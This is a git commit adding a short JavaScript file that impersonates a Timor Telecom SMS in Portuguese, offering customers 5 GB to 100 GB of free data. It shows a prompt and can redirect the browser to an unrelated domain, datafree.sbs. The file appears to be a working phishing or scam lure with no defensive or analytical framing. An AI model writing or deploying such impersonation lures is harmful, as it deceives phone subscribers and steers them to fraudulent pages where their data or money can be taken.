775242549f378bb2029cfce93de1376a4701d330
mmainomi <akparawa247@gmail.com>
2025-03-26 22:28:07 -0700

    Create activation-timor-telecom-freedata.js

---
+++ activation-timor-telecom-freedata.js
@@ -0,0 +1,6 @@
+
+var password = 'DADOS GRATUITOS'
+password=prompt('SMS: Estimado cliente, por favor verifique se o seu cartão SIM Timor Telecom está qualificado para receber 5 GB a 100 GB de dados, recompensa para clientes antigos, pressione DADOS GRÁTIS para verificar agora ','DADOS GRATUITOS');
+if (password != 'DADOS GRATUITOS') {
+location.href='https://datafree.sbs/timor-telecom-freedata.html';
+}
